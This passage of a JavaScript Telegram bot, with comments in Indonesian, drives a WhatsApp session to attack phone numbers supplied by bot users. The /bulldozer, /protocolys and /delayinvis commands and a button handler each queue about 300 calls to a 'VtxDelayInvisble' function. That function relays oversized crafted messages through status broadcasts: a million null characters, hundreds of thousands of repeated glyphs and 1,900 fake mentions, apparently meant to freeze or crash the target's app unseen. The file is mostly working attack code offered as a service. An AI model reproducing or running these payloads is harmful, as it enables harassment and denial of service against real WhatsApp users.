  } else if (text.startsWith('/nulis ')) {
    const query = text.replace('/nulis ', '').trim();
    if (!query) {
      return telegramBot.sendMessage(chatId, "❌ Format: /nulis <text>");
    }

    try {
      const loadingMsg = await telegramBot.sendMessage(chatId, "Processing...");
      
      const apiUrl = `https://api.elrayyxml.web.id/api/maker/nulis?text=${encodeURIComponent(query)}`;
      const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
      
      await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      
      telegramBot.sendPhoto(chatId, Buffer.from(response.data), {
        caption: `✅ Handwriting Created\nText: ${query}`,
        parse_mode: "HTML"
      });
      
    } catch (error) {
      telegramBot.sendMessage(chatId, `❌ Gagal membuat tulisan: ${error.message}`);
    }

  // === FITUR ATTACK PREMIUM ===
  } else if (text.startsWith('/bulldozer ')) {
    const number = text.split(' ')[1];
    if (!number) {
      return telegramBot.sendMessage(chatId, "❌ Format: /bulldozer 62xxx");
    }

    // Cek cooldown
    if (isInCooldown(userId)) {
      const cooldownTime = getCooldownTime(userId);
      return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan bug lagi.`);
    }

    try {
      const normalizedNumber = normalizePhoneNumber(number);
      const jid = normalizedNumber + "@s.whatsapp.net";
      
      let loadingMsg = await telegramBot.sendMessage(chatId, "🖕");
      
      await sleep(2000);
      
      console.log(`📡 Type : bulldozer attack ${jid}`);
      
      const successCaption = `
<blockquote><b>Successfully Attacking</b></blockquote>
• Your target: <tg-spoiler>${normalizedNumber}</tg-spoiler>
• Type bug: bulldozer
• Attack: Success 
• Status: Invisible Attack
`;

      await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      
      telegramBot.sendPhoto(chatId, "https://files.catbox.moe/07f0vl.jpg", {
        caption: successCaption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Cek Target",
                url: `https://wa.me/${normalizedNumber}`
              }
            ]
          ]
        }
      });
      
      // Set cooldown 5 detik
      setCooldown(userId);
      
      // KIRIM ATTACK DI BACKGROUND
      setTimeout(async () => {
        for (let i = 0; i < 15; i++) {
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await sleep(6000);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await sleep(6000);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
        }
      }, 100);
      
    } catch (err) {
      telegramBot.sendMessage(chatId, `❌ Gagal mengirim bulldozer attack: ${err.message}`);
    }

  } else if (text.startsWith('/protocolys ')) {
    const number = text.split(' ')[1];
    if (!number) {
      return telegramBot.sendMessage(chatId, "❌ Format: /protocolys 62xxx");
    }

    // Cek cooldown
    if (isInCooldown(userId)) {
      const cooldownTime = getCooldownTime(userId);
      return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan bug lagi.`);
    }

    try {
      const normalizedNumber = normalizePhoneNumber(number);
      const jid = normalizedNumber + "@s.whatsapp.net";
      
      let loadingMsg = await telegramBot.sendMessage(chatId, "🖕");
      
      await sleep(2000);
      
      console.log(`📡 Type : protocolys attack ${jid}`);
      
      const successCaption = `
<blockquote><b>Successfully Attacking</b></blockquote>
• Your target: <tg-spoiler>${normalizedNumber}</tg-spoiler>
• Type bug: protocolys
• Attack: Succes
• Status: Invisible Attack
`;

      await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      
      telegramBot.sendPhoto(chatId, "https://files.catbox.moe/07f0vl.jpg", {
        caption: successCaption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Cek Target",
                url: `https://wa.me/${normalizedNumber}`
              }
            ]
          ]
        }
      });
      
      // Set cooldown 5 detik
      setCooldown(userId);
      
      // KIRIM ATTACK DI BACKGROUND
      setTimeout(async () => {
        for (let i = 0; i < 15; i++) {
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await sleep(6000);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await sleep(6000);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
        }
      }, 100);
      
    } catch (err) {
      telegramBot.sendMessage(chatId, `❌ Gagal mengirim protocolys attack: ${err.message}`);
    }

  } else if (text.startsWith('/delayinvis ')) {
    const number = text.split(' ')[1];
    if (!number) {
      return telegramBot.sendMessage(chatId, "❌ Format: /delayinvis 62xxx");
    }

    // Cek cooldown
    if (isInCooldown(userId)) {
      const cooldownTime = getCooldownTime(userId);
      return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan bug lagi.`);
    }

    try {
      const normalizedNumber = normalizePhoneNumber(number);
      const jid = normalizedNumber + "@s.whatsapp.net";
      
      let loadingMsg = await telegramBot.sendMessage(chatId, "🖕");
      
      await sleep(2000);
      
      console.log(`📡 Type : delayinvis attack ${jid}`);
      
      const successCaption = `
<blockquote><b>Successfully Attacking</b></blockquote>
• Your target: <tg-spoiler>${normalizedNumber}</tg-spoiler>
• Type bug: delayinvis
• Attack: Succes
• Status: Invisible Attack
`;

      await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      
      telegramBot.sendPhoto(chatId, "https://files.catbox.moe/07f0vl.jpg", {
        caption: successCaption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Cek Target",
                url: `https://wa.me/${normalizedNumber}`
              }
            ]
          ]
        }
      });
      
      // Set cooldown 5 detik
      setCooldown(userId);
      
      // KIRIM ATTACK DI BACKGROUND
      setTimeout(async () => {
        for (let i = 0; i < 15; i++) {
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await sleep(6000);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await sleep(6000);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
        }
      }, 100);
      
    } catch (err) {
      telegramBot.sendMessage(chatId, `❌ Gagal mengirim delayinvis attack: ${err.message}`);
    }
  }
});

// Handle callback queries (button clicks)
telegramBot.on('callback_query', async (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;
  const chatId = message.chat.id;

  if (data.startsWith('bug_')) {
    const parts = data.split('_');
    const attackType = parts[1];
    const number = parts[2];

    // Cek cooldown
    if (isInCooldown(userId)) {
      const cooldownTime = getCooldownTime(userId);
      
      await telegramBot.answerCallbackQuery(callbackQuery.id, {
        text: `Cooldown: ${cooldownTime} detik`
      });
      return;
    }

    // Edit pesan menjadi "loading proses..."
    await telegramBot.editMessageText('🖕', {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: 'Markdown'
    });

    // Tunggu 2 detik
    await sleep(2000);

    try {
      const jid = number + "@s.whatsapp.net";
      console.log(`📡 Type : ${attackType} attack ${jid}`);

      // Auto delete pesan loading
      await telegramBot.deleteMessage(chatId, message.message_id).catch(() => {});

      const successCaption = `
<blockquote><b>Successfully Attacking</b></blockquote>
• Your target: <tg-spoiler>${number}</tg-spoiler>
• Type bug: ${attackType}
• Attack: Succes
• Status: Invisible Attack
`;

      const resultMsg = await telegramBot.sendPhoto(chatId, "https://files.catbox.moe/07f0vl.jpg", {
        caption: successCaption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Cek Target",
                url: `https://wa.me/${number}`
              }
            ]
          ]
        }
      });

      // Set cooldown 5 detik
      setCooldown(userId);

      // Hapus state user
      delete userStates[userId];

      // KIRIM ATTACK DI BACKGROUND
      setTimeout(async () => {
        for (let i = 0; i < 15; i++) {
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await sleep(6000);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await sleep(6000);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
          await VtxDelayInvisble(jid, waSocket);
        }
      }, 100);

    } catch (err) {
      await telegramBot.sendMessage(chatId, `❌ Gagal mengirim ${attackType} attack: ${err.message}`);
    }
  }
});

console.log(chalk.cyan("🤖 Bot Telegram aktif..."));

let waSocket = null;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function VtxDelayInvisble(jid, sock) {
  try {
    let delay1 = await generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "@XBhigh",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "call_permission_message",
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    let delay2 = {
      extendedTextMessage: {
        text: "ON Tele\\>🍷𞋯" + "ꦾ".repeat(299986),
        contextInfo: {
          participant: jid,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    };

    const delay001 = generateWAMessageFromContent(jid, delay2, {});
    await sock.relayMessage("status@broadcast", delay001.message, {
      messageId: delay001.key.id,
      statusJidList: [jid],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: jid }, content: undefined }
          ]
        }]
      }]
    });

    await sock.relayMessage("status@broadcast", delay1.message, {
      messageId: delay1.key.id,
      statusJidList: [jid],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: jid }, content: undefined }
          ]
        }]
      }]
    });

  } catch (error) {
    console.error("Error di :", error, "Icikiwir Eror Anj 😹");
  }
}

async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });
  waSocket = sock;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
      console.log("❌ Koneksi WA terputus:", reason);
      startBot();
    }
    if (connection === "open") {
      console.clear();
      console.log(chalk.green(`
      
⡏⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿
⣿⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⣿
⣿⣧⡀⠀⠀⠀⠀⠙⠿⠿⠿⠻⠿⠿⠟⠿⠛⠉⠀⠀⠀⠀⠀⣸⣿
⣿⣿⣷⣄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿
⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣴⣿⣿⣿⣿
⣿⣿⣿⡟⠀⠀⢰⣹⡆⠀⠀⠀⠀⠀⠀⣭⣷⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⠃⠀⠀⠈⠉⠀⠀⠤⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⢿⣿⣿⣿
⣿⣿⣿⢾⣿⣷⠀⠀⠀⠀⡠⠤⢄⠀⠀⠀⠠⣿⣿⣷⠀⢸⣿⣿⣿
⣿⣿⣿⡀⠉⠀⠀⠀⠀⠀⢄⠀⢀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿
⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿
⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿ 
      `));
    }
  });

  sock.ev.on("creds.update", saveCreds);

  if (!waSocket.authState.creds.registered) {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    rl.question("🔑 Masukkan Password: ", (pw) => {
      if (pw !== "smooth6967") {
        console.log("❌ Password salah, keluar...");
        rl.close();
        process.exit(0);
      }

      rl.question("📱 Masukkan nomor WhatsApp\nNo Kamu : ", async (number) => {
        try {
          const code = await waSocket.requestPairingCode(number);
          console.log(`🔑 Kode Pairing untuk ${number}: ${code}`);
        } catch (e) {
          console.error("❌ Gagal generate pairing:", e.message);
        }
        rl.close();
      });
    });
  }
}

const app = express();
app.use(cors());
app.use(express.json());
app.use("/", express.static(path.join(__dirname, "public")));

startBot();
app.listen(2004, () => console.log(chalk.blue("🌐 Server aktif di jembut")));